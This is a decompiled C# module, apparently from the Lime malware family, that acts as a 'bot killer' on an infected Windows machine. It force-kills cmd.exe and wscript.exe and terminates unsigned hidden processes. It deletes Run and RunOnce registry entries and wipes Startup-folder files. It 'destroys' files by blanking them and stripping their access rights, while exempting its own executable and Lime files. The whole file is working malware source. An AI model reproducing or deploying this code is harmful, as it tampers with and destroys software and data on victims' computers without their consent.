using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Lime;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class BotKillers
{
	public enum ThreadAccess
	{
		DIRECT_IMPERSONATION = 512,
		GET_CONTEXT = 8,
		IMPERSONATE = 256,
		QUERY_INFORMATION = 64,
		SET_CONTEXT = 16,
		SET_INFORMATION = 32,
		SET_THREAD_TOKEN = 128,
		SUSPEND_RESUME = 2,
		TERMINATE = 1
	}

	public enum WinTrustDataUIChoice : uint
	{
		All = 1u,
		None,
		NoBad,
		NoGood
	}

	public enum WinTrustDataRevocationChecks : uint
	{
		None,
		WholeChain
	}

	public enum WinTrustDataChoice : uint
	{
		File = 1u,
		Catalog,
		Blob,
		Signer,
		Certificate
	}

	public enum WinTrustDataStateAction : uint
	{
		Ignore,
		Verify,
		Close,
		AutoCache,
		AutoCacheFlush
	}

	[Flags]
	public enum WinTrustDataProvFlags : uint
	{
		UseIe4TrustFlag = 1u,
		NoIe4ChainFlag = 2u,
		NoPolicyUsageFlag = 4u,
		RevocationCheckNone = 0x10u,
		RevocationCheckEndCert = 0x20u,
		RevocationCheckChain = 0x40u,
		RevocationCheckChainExcludeRoot = 0x80u,
		SaferFlag = 0x100u,
		HashOnlyFlag = 0x200u,
		UseDefaultOsverCheck = 0x400u,
		LifetimeSigningFlag = 0x800u,
		CacheOnlyUrlRetrieval = 0x1000u
	}

	public enum WinTrustDataUIContext : uint
	{
		Execute,
		Install
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public class WinTrustFileInfo
	{
		private int StructSize;

		private IntPtr pszFilePath;

		private IntPtr hFile;

		private IntPtr pgKnownSubject;

		public WinTrustFileInfo(string _filePath)
		{
			StructSize = Marshal.SizeOf(typeof(WinTrustFileInfo));
			hFile = IntPtr.Zero;
			pgKnownSubject = IntPtr.Zero;
			pszFilePath = Marshal.StringToCoTaskMemAuto(_filePath);
		}

		~WinTrustFileInfo()
		{
			Marshal.FreeCoTaskMem(pszFilePath);
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public class WinTrustData
	{
		private int StructSize;

		private IntPtr PolicyCallbackData;

		private IntPtr SIPClientData;

		private WinTrustDataUIChoice UIChoice;

		private WinTrustDataRevocationChecks RevocationChecks;

		private WinTrustDataChoice UnionChoice;

		private IntPtr FileInfoPtr;

		private WinTrustDataStateAction StateAction;

		private IntPtr StateData;

		private string URLReference;

		private WinTrustDataProvFlags ProvFlags;

		private WinTrustDataUIContext UIContext;

		public WinTrustData(string _fileName)
		{
			StructSize = Marshal.SizeOf(typeof(WinTrustData));
			PolicyCallbackData = IntPtr.Zero;
			SIPClientData = IntPtr.Zero;
			UIChoice = WinTrustDataUIChoice.None;
			RevocationChecks = WinTrustDataRevocationChecks.None;
			UnionChoice = WinTrustDataChoice.File;
			StateAction = WinTrustDataStateAction.Ignore;
			StateData = IntPtr.Zero;
			URLReference = null;
			ProvFlags = WinTrustDataProvFlags.SaferFlag;
			UIContext = WinTrustDataUIContext.Execute;
			WinTrustFileInfo structure = new WinTrustFileInfo(_fileName);
			FileInfoPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(WinTrustFileInfo)));
			Marshal.StructureToPtr((object)structure, FileInfoPtr, fDeleteOld: false);
		}

		~WinTrustData()
		{
			Marshal.FreeCoTaskMem(FileInfoPtr);
		}
	}

	public enum WinVerifyTrustResult
	{
		Success = 0,
		ProviderUnknown = -2146762751,
		ActionUnknown = -2146762750,
		SubjectFormUnknown = -2146762749,
		SubjectNotTrusted = -2146762748
	}

	public sealed class WinTrust
	{
		private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

		private const string WINTRUST_ACTION_GENERIC_VERIFY_V2 = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";

		[DllImport("wintrust.dll", CharSet = CharSet.Unicode, ExactSpelling = true)]
		private static extern WinVerifyTrustResult WinVerifyTrust([In] IntPtr hwnd, [In][MarshalAs(UnmanagedType.LPStruct)] Guid pgActionID, [In] WinTrustData pWVTData);

		public static bool VerifyEmbeddedSignature(string fileName)
		{
			try
			{
				WinTrustData pWVTData = new WinTrustData(fileName);
				Guid pgActionID = new Guid("{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}");
				WinVerifyTrustResult winVerifyTrustResult = WinVerifyTrust(INVALID_HANDLE_VALUE, pgActionID, pWVTData);
				return winVerifyTrustResult == WinVerifyTrustResult.Success;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		private WinTrust()
		{
		}
	}

	private static int ProccessKilled = 0;

	private static int Startupkilled = 0;

	private static string hio;

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	public static void RunStandardBotKiller()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 122:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_002a;
						case 5:
							goto IL_0031;
						case 6:
							goto IL_0038;
						case 7:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 8:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0038:
					num = 6;
					ProccessKilled = 0;
					break;
					IL_0031:
					num = 5;
					RunStartupKiller();
					goto IL_0038;
					IL_000a:
					num = 2;
					Interaction.Shell("TASKKILL /F /IM wscript.exe", (AppWinStyle)0, false, -1);
					goto IL_001a;
					IL_001a:
					num = 3;
					Interaction.Shell("TASKKILL /F /IM cmd.exe", (AppWinStyle)0, false, -1);
					goto IL_002a;
					IL_002a:
					num = 4;
					ScanProcess();
					goto IL_0031;
					end_IL_0001_2:
					break;
				}
				num = 7;
				Startupkilled = 0;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 122;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ScanProcess()
	{
		checked
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				int num = processes.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					Process process = processes[i];
					try
					{
						string fullPath = Path.GetFullPath(process.MainModule!.FileName);
						if (IsFileMalicious(fullPath) && !WindowIsVisible(process.MainWindowTitle))
						{
							TerminateProcess(process.Id);
							DestroyFile(fullPath);
							ProccessKilled++;
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static bool IsFileMalicious(string fileloc)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool result = default(bool);
		FileAttributes attributes = default(FileAttributes);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 619:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0027;
						case 4:
							goto IL_0036;
						case 5:
						case 6:
							goto IL_003f;
						case 7:
							goto IL_004e;
						case 8:
						case 9:
							goto IL_0057;
						case 10:
							goto IL_0067;
						case 11:
						case 12:
							goto IL_0071;
						case 13:
							goto IL_0081;
						case 14:
						case 15:
							goto IL_008b;
						case 16:
							goto IL_00a0;
						case 17:
						case 18:
							goto IL_00a9;
						case 19:
							goto IL_00b9;
						case 20:
						case 21:
							goto IL_00c3;
						case 22:
							goto IL_00d3;
						case 23:
						case 24:
							goto IL_00dd;
						case 25:
							goto IL_00ed;
						case 26:
						case 27:
							goto IL_00f7;
						case 28:
							goto IL_0107;
						case 29:
						case 30:
							goto IL_0111;
						case 31:
							goto IL_0121;
						case 32:
						case 33:
							goto IL_0128;
						case 34:
							goto IL_0133;
						case 35:
						case 36:
							goto IL_013a;
						case 37:
							goto IL_015d;
						case 38:
						case 39:
							goto IL_0164;
						case 40:
							goto IL_016f;
						case 41:
							goto IL_017b;
						case 42:
						case 43:
							goto IL_0182;
						case 44:
							goto IL_018e;
						case 45:
						case 46:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 47:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_018e:
					num = 44;
					result = true;
					goto end_IL_0001_3;
					IL_0182:
					num = 43;
					if ((attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
					{
						break;
					}
					goto IL_018e;
					IL_000a:
					num = 2;
					Path.GetFileNameWithoutExtension(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Core.RG);
					goto IL_0027;
					IL_0027:
					num = 3;
					if (fileloc.Contains(Application.get_ExecutablePath()))
					{
						goto IL_0036;
					}
					goto IL_003f;
					IL_0036:
					num = 4;
					result = false;
					goto end_IL_0001_3;
					IL_003f:
					num = 6;
					if (fileloc.Contains(Core.RG))
					{
						goto IL_004e;
					}
					goto IL_0057;
					IL_004e:
					num = 7;
					result = false;
					goto end_IL_0001_3;
					IL_0057:
					num = 9;
					if (fileloc.Contains("Ransomware"))
					{
						goto IL_0067;
					}
					goto IL_0071;
					IL_0067:
					num = 10;
					result = false;
					goto end_IL_0001_3;
					IL_0071:
					num = 12;
					if (fileloc.EndsWith(".Lime"))
					{
						goto IL_0081;
					}
					goto IL_008b;
					IL_0081:
					num = 13;
					result = false;
					goto end_IL_0001_3;
					IL_008b:
					num = 15;
					if (fileloc.ToLower().Contains("malware"))
					{
						goto IL_00a0;
					}
					goto IL_00a9;
					IL_00a0:
					num = 16;
					DestroyFile(fileloc);
					goto IL_00a9;
					IL_00a9:
					num = 18;
					if (fileloc.Contains("Google.com"))
					{
						goto IL_00b9;
					}
					goto IL_00c3;
					IL_00b9:
					num = 19;
					result = false;
					goto end_IL_0001_3;
					IL_00c3:
					num = 21;
					if (fileloc.Contains("Microsoft.com"))
					{
						goto IL_00d3;
					}
					goto IL_00dd;
					IL_00d3:
					num = 22;
					result = false;
					goto end_IL_0001_3;
					IL_00dd:
					num = 24;
					if (fileloc.Contains("cmd"))
					{
						goto IL_00ed;
					}
					goto IL_00f7;
					IL_00ed:
					num = 25;
					result = true;
					goto end_IL_0001_3;
					IL_00f7:
					num = 27;
					if (fileloc.Contains("wscript"))
					{
						goto IL_0107;
					}
					goto IL_0111;
					IL_0107:
					num = 28;
					result = true;
					goto end_IL_0001_3;
					IL_0111:
					num = 30;
					if (fileloc.Contains(RuntimeEnvironment.GetRuntimeDirectory()))
					{
						goto IL_0121;
					}
					goto IL_0128;
					IL_0121:
					num = 31;
					result = true;
					goto end_IL_0001_3;
					IL_0128:
					num = 33;
					if (WinTrust.VerifyEmbeddedSignature(fileloc))
					{
						goto IL_0133;
					}
					goto IL_013a;
					IL_0133:
					num = 34;
					result = false;
					goto end_IL_0001_3;
					IL_013a:
					num = 36;
					if (fileloc.Contains(Environment.GetEnvironmentVariable("USERPROFILE")) | fileloc.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)))
					{
						goto IL_015d;
					}
					goto IL_0164;
					IL_015d:
					num = 37;
					result = true;
					goto end_IL_0001_3;
					IL_0164:
					num = 39;
					attributes = File.GetAttributes(fileloc);
					goto IL_016f;
					IL_016f:
					num = 40;
					if ((attributes & FileAttributes.System) == FileAttributes.System)
					{
						goto IL_017b;
					}
					goto IL_0182;
					IL_017b:
					num = 41;
					result = true;
					goto end_IL_0001_3;
					end_IL_0001_2:
					break;
				}
				num = 46;
				result = false;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 619;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void KillFile(string location)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(location);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.SetAccessRuleProtection(isProtected: true, preserveInheritance: false);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool WindowIsVisible(string WinTitle)
	{
		try
		{
			IntPtr hWnd = FindWindow(null, WinTitle);
			return IsWindowVisible(hWnd);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void RunStartupKiller()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string current = default(string);
		IEnumerator<string> enumerator = default(IEnumerator<string>);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 429:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0017;
						case 4:
							goto IL_0024;
						case 5:
							goto IL_002d;
						case 6:
							goto IL_003a;
						case 7:
						case 8:
							goto IL_0047;
						case 9:
							goto IL_0064;
						case 10:
							goto IL_00b0;
						case 11:
							goto IL_0104;
						case 12:
							goto IL_010e;
						case 13:
							goto IL_0118;
						case 14:
							goto IL_0122;
						case 15:
							goto IL_012c;
						case 16:
						case 17:
							goto IL_0136;
						case 18:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 19:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_012c:
					num = 15;
					DestroyFile(current);
					goto IL_0136;
					IL_0122:
					num = 14;
					Thread.Sleep(50);
					goto IL_012c;
					IL_000a:
					num = 2;
					StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 1);
					goto IL_0017;
					IL_0017:
					num = 3;
					StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", 1);
					goto IL_0024;
					IL_0024:
					num = 4;
					if (IsAdmin())
					{
						goto IL_002d;
					}
					goto IL_0047;
					IL_002d:
					num = 5;
					StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 2);
					goto IL_003a;
					IL_003a:
					num = 6;
					StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", 2);
					goto IL_0047;
					IL_0047:
					num = 8;
					Path.GetFileNameWithoutExtension(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Core.RG);
					goto IL_0064;
					IL_0064:
					num = 9;
					enumerator = ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs() + "\\Startup").GetEnumerator();
					goto IL_009b;
					IL_009b:
					if (!enumerator.MoveNext())
					{
						break;
					}
					current = enumerator.Current;
					goto IL_00b0;
					IL_0136:
					num = 17;
					goto IL_009b;
					IL_00b0:
					num = 10;
					if (!current.Contains(Application.get_ExecutablePath()) & !current.Contains(Core.RG) & !current.EndsWith(".Lime") & !current.EndsWith(".txt") & !current.EndsWith(".ini"))
					{
						goto IL_0104;
					}
					goto IL_0136;
					IL_0104:
					num = 11;
					DestroyFile(current);
					goto IL_010e;
					IL_010e:
					num = 12;
					Thread.Sleep(50);
					goto IL_0118;
					IL_0118:
					num = 13;
					DestroyFile(current);
					goto IL_0122;
					end_IL_0001_2:
					break;
				}
				num = 18;
				enumerator?.Dispose();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 429;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void StartupFucker(string regkey, int type)
	{
		try
		{
			RegistryKey registryKey = default(RegistryKey);
			if (type == 1)
			{
				registryKey = Registry.CurrentUser.OpenSubKey(regkey);
			}
			if (type == 2)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(regkey);
			}
			string[] valueNames = registryKey.GetValueNames();
			foreach (string text in valueNames)
			{
				try
				{
					string text2 = registryKey.GetValue(text)!.ToString();
					if (text2.Contains("-"))
					{
						if (text2.Contains("\""))
						{
							text2.Replace("\"", string.Empty);
						}
						try
						{
							string[] array = Strings.Split(text2, " -", -1, (CompareMethod)0);
							text2 = array[0];
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					if (text2.Contains("\""))
					{
						object[] array2 = text2.Split(new char[1] { '"' });
						text2 = Conversions.ToString(array2[1]);
					}
					if (!text2.Contains(Core.RG) & !text2.Contains(Application.get_ExecutablePath()))
					{
						RemoveKey(type, text, regkey, text2);
						if (!WinTrust.VerifyEmbeddedSignature(text2))
						{
							TerminateProcessPath(text2);
							DestroyFile(text2);
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static void RemoveKey(int Reg, string file, string reglocation, string FileLocation)
	{
		try
		{
			RegistryKey registryKey = null;
			registryKey = ((Reg != 1) ? Registry.LocalMachine.OpenSubKey(reglocation, writable: true) : Registry.CurrentUser.OpenSubKey(reglocation, writable: true));
			using (registryKey)
			{
				registryKey?.DeleteValue(file);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void DestroyFile(string path)
	{
		try
		{
			if (File.Exists(path))
			{
				Random random = new Random();
				try
				{
					AllowAccess(path);
					((ServerComputer)MyProject.Computer).get_FileSystem().MoveFile(path, Path.GetTempPath() + Conversions.ToString(random.Next(10000, 90000)));
					File.WriteAllText(path, string.Empty);
					FileSystem.FileOpen(FileSystem.FreeFile(), path, (OpenMode)1, (OpenAccess)(-1), (OpenShare)0, -1);
					KillFile(path);
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					DirectoryInfo directoryInfo = new DirectoryInfo(path);
					DirectorySecurity directorySecurity = new DirectorySecurity();
					directorySecurity.SetAccessRuleProtection(isProtected: true, preserveInheritance: false);
					directoryInfo.SetAccessControl(directorySecurity);
					ProjectData.ClearProjectError();
					return;
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static bool IsAdmin()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void AllowAccess(string location)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(location);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.SetAccessRuleProtection(isProtected: false, preserveInheritance: true);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void TerminateProcessPath(string Path)
	{
		checked
		{
			try
			{
				if (Path.Contains(Process.GetCurrentProcess().ProcessName.ToString()))
				{
					return;
				}
				if (Path.Contains("\\"))
				{
					string[] array = Strings.Split(Path, "\\", -1, (CompareMethod)0);
					string[] array2 = array;
					foreach (string text in array2)
					{
						if (text.Contains(".exe"))
						{
							Path = text;
						}
					}
				}
				if (Path.Contains(".exe"))
				{
					Path = Path.Replace(".exe", string.Empty);
				}
				Process[] processes = Process.GetProcesses();
				int num = processes.Length - 1;
				for (int j = 0; j <= num; j++)
				{
					Process process = processes[j];
					if (process.ProcessName.Contains(Path))
					{
						TerminateProcess(process.Id);
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void TerminateProcess(int PID)
	{
		try
		{
			Process processById = Process.GetProcessById(PID);
			if (Operators.CompareString(processById.ProcessName, string.Empty, false) == 0)
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = processById.Threads.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ProcessThread processThread = (ProcessThread)enumerator.Current;
					IntPtr intPtr = OpenThread((ThreadAccess)3, bInheritHandle: true, checked((uint)processThread.Id));
					if (intPtr != IntPtr.Zero)
					{
						SuspendThread(intPtr);
						TerminateThread(intPtr, 1u);
						CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr hHandle);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern int SuspendThread(IntPtr hThread);

	[DllImport("kernel32.dll")]
	private static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);
}
